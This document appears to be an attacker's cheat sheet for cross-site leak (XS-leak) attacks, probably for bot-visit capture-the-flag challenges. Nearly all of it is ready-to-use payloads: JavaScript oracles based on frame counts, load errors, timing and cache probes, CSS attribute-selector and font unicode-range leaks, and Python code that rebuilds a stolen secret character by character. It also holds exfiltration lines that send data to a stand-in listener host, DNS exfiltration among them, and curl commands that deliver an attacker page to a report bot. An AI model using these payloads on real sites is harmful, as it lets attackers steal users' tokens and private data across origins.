# Extended corpus — every XS-leak oracle and payload, exhaustively

The complete index — the oracles, the greps, the payloads, the channels.

---

## A. The oracle taxonomy — every channel by family

```text
=== CLASSIC (client-side measures — your JS runs) ===
frames.length        — a count: one <iframe> per result
onload/onerror       — a hit/miss: a 200 vs a 404/500
performance.now()    — a timing: a slow-vs-fast response
cache-probe          — a cached-vs-uncached timing
:visited             — a history: was the URL visited
window.open          — a navigation: did the redirect happen
scrollHeight         — a size: a content-length side-channel
resource-timing      — a load-duration read
DOM-timing           — a render-time side-channel

=== SEALED (declarative/server-state — no attacker JS) ===
CSS selector         — an attribute-match → a font/URL load
@font-face           — a unicode-range → a character-set
LRU eviction         — the surviving keys are the leak
counter++            — the next value is the leak
one-shot token       — the consumed-or-not bit
rate-limit bucket    — the remaining quota
'last seen'          — the recency timestamp
a DOM-writeback      — a screenshotting bot's read
```

## B. The source greps — finding each oracle's surface

```bash
# the bot — the victim-viewer
grep -rnoiE 'bot|admin|visit|report|url.*submit|review|goto|newPage|puppeteer|playwright|selenium|headless|incognito|createIncognito|URLBlocklist|URLAllowlist|policy|managed' <src> | head -30

# the CSP — the channel's gates
grep -rnoiE 'content-security-policy|script-src|style-src|font-src|img-src|default-src|connect-src|unsafe-inline|unsafe-eval|nonce' <src> | head -20

# the reflected secret — a CSS-matchable attribute or a text node
grep -rnoE 'data-[a-z-]+|value=|placeholder=|secret.*=|token.*=|setAttribute|<div.*secret|id.*secret|innerHTML|textContent' <src> | head -20

# the CSS-injection surface
grep -rnoiE 'custom.*css|theme|stylesheet|<style|style.*inject|@import|link.*stylesheet|font-family|@font-face|unicode-range' <src> | head -20

# the server-state surface
grep -rnoiE 'redis|lru|maxmemory|allkeys|evict|cache|store|setex|expire|counter|incr|quota|rate.?limit|GETDEL|GETEX|nonce|last.?seen|timestamp|recent' <src> | head -30

# the frame-count surface — a per-result iframe
grep -rnoiE 'iframe|frame|render.*result|result.*frame|search.*iframe' <src> | head -10
```

## C. The classic client-side payloads — one per oracle

```js
// === frames.length ===
var f=document.createElement('iframe');
f.src='https://t/search?q='+encodeURIComponent(g);
f.onload=()=>exfil(g+'='+f.contentWindow.frames.length);
document.body.appendChild(f);

// === onload/onerror — an <img> ===
var i=new Image();
i.onload=()=>exfil(g+'=H'); i.onerror=()=>exfil(g+'=M');
i.src='https://t/api/search?q='+encodeURIComponent(g);

// === a <script> variant ===
var s=document.createElement('script');
s.onload=()=>exfil(g+'=H'); s.onerror=()=>exfil(g+'=M');
s.src='https://t/api/search?q='+encodeURIComponent(g);
document.body.appendChild(s);

// === an <iframe> variant ===
var f=document.createElement('iframe');
f.onload=()=>exfil(g+'=H'); f.onerror=()=>exfil(g+'=M');
f.src='https://t/search?q='+encodeURIComponent(g);
document.body.appendChild(f);

// === a <link> variant ===
var l=document.createElement('link');
l.rel='stylesheet';
l.onload=()=>exfil(g+'=H'); l.onerror=()=>exfil(g+'=M');
l.href='https://t/r/'+encodeURIComponent(g);
document.head.appendChild(l);

// === a timing oracle ===
var t0=performance.now();
fetch('https://t/api/search?q='+encodeURIComponent(g),{mode:'no-cors'})
 .finally(()=>exfil(g+'='+Math.round(performance.now()-t0)));

// === a cache-probe ===
var t0=performance.now(); var i=new Image();
i.onload=()=>exfil(g+'='+Math.round(performance.now()-t0));
i.src='https://t/r/'+encodeURIComponent(g)+'?cb='+Math.random();

// === a window.open ===
var w=window.open('https://t/x?q='+encodeURIComponent(g));
setTimeout(()=>exfil('open='+(w&&!w.closed)),2000);

// === a scrollHeight ===
var f=document.createElement('iframe');
f.src='https://t/search?q='+encodeURIComponent(g);
f.onload=()=>exfil(g+'='+f.contentDocument.body.scrollHeight);
document.body.appendChild(f);

// === a resource-timing read ===
performance.getEntriesByName('https://t/r/'+encodeURIComponent(g))
 .forEach(e=>exfil(e.name+'='+e.duration));
```

## D. The CSS-selector payloads — the declarative channel

```css
/* === the prefix oracle === */
body[secret^="a"]{--m_a:url('/leak/a')}
body[secret^="ab"]{--m_ab:url('/leak/ab')}
/* === the suffix oracle === */
body[secret$="f"]{--m_f:url('/leak/f')}
/* === the substring oracle === */
body[secret*="abc"]{--m_abc:url('/leak/abc')}
/* === the exact-match oracle === */
body[secret="full-token"]{--m_full:url('/leak/full')}
/* === the char-in-set oracle === */
body[secret*="a"]{--m_ha:url('/leak/has-a')}
/* === the consumer — a multi-layer background === */
#trig{background-image:var(--m_a,none),var(--m_ab,none),var(--m_f,none),var(--m_abc,none),var(--m_full,none),var(--m_ha,none)}
/* === the @font-face unicode-range — a char-set === */
@font-face{font-family:x;src:url('/leak/61');unicode-range:U+0061}
@font-face{font-family:x;src:url('/leak/62');unicode-range:U+0062}
/* ... the whole 62-char alphabet */
#secret{font-family:x;display:block !important}
/* === the control pair === */
body[secret]{--yes:url('/leak/YES')}
body[nosuchattr]{--no:url('/leak/NO')}
#trig{background-image:var(--yes,none),var(--no,none)}
```

## E. The server-state payloads — the sealed channel

```bash
# === the LRU-eviction channel ===
# a redis --maxmemory-policy allkeys-lru — flood the store → the
# survivors are the bot's GETs — a thousand-bit channel
# === the counter channel ===
# a GET that increments a readable counter → 'the counter is N+1'
# === the one-shot token ===
# a GETDEL → 'did it survive' — one bit, burns the check
# === the rate-limit bucket ===
# a remaining count → the consumed quota
# === the 'last seen' timestamp ===
# a recency read → 'the GET ran at T'
```

## F. The reconstruction payloads — the secret-assembly

```python
# === a binary-search boolean oracle ===
charset='abcdefghijklmnopqrstuvwxyz0123456789'
known=''
while len(known)<32:
    for c in charset:
        if oracle(known+c): known+=c; break

# === a sorted secret — the char-set direct answer ===
token=''.join(sorted(leaked_chars))

# === an n-gram beam search ===
def beam(ngrams,w=10,L=32):
    beam=[('',0.)]
    for _ in range(L):
        cand=[]
        for s,sc in beam:
            for ng in ngrams:
                if ng[:-1]==s[-len(ng)+1:]:
                    cand.append((s+ng[-1],sc+score(ng)))
        beam=sorted(cand,key=lambda x:-x[1])[:w]
    return beam[0][0]
```

## G. The exfil payloads — the read-back channel

```js
// === a GET to the listener ===
fetch('https://a/?'+encodeURIComponent(d))
// === an img GET ===
new Image().src='https://a/?'+encodeURIComponent(d)
// === a beacon ===
navigator.sendBeacon('https://a/',d)
// === a postMessage ===
parent.postMessage(d,'*')
// === a DNS exfil ===
new Image().src='https://'+btoa(d)+'.a.com/'
// === a write-back ===
fetch('https://t/api/comment',{method:'POST',body:JSON.stringify({t:d})})
// === a DOM-writeback ===
document.body.innerHTML='<div style="font-size:80px">'+d+'</div>'
```

## H. The delivery payloads — the bot's path

```bash
# === a /report endpoint ===
curl -X POST "$BASE/report" -d 'url=https://attacker/page'
# === a data: URL ===
curl -X POST "$BASE/report" --data-urlencode 'url=data:text/html,<html>...'
# === a stored page ===
# === a fragment ===
curl -X POST "$BASE/report" -d 'url=https://target/page#' + fragment
```

## I. The signal-to-channel map — which surface names which oracle

```text
a script-src 'none'            → a sealed shape → CSS/server-state
a style-src 'unsafe-inline'    → the CSS oracle survives
a font-src wildcard            → the @font-face exfil
a redis LRU                    → the eviction channel
a counter/quota                → the counter channel
a one-shot token               → the single-use flag
a reflected secret attribute   → the CSS-selector oracle
a secret in text               → the unicode-range oracle
a /report + a URL              → the classic shape (if JS runs)
a managed policy               → a forced sealed shape
an airgapped bot               → a server-state/write-back
```
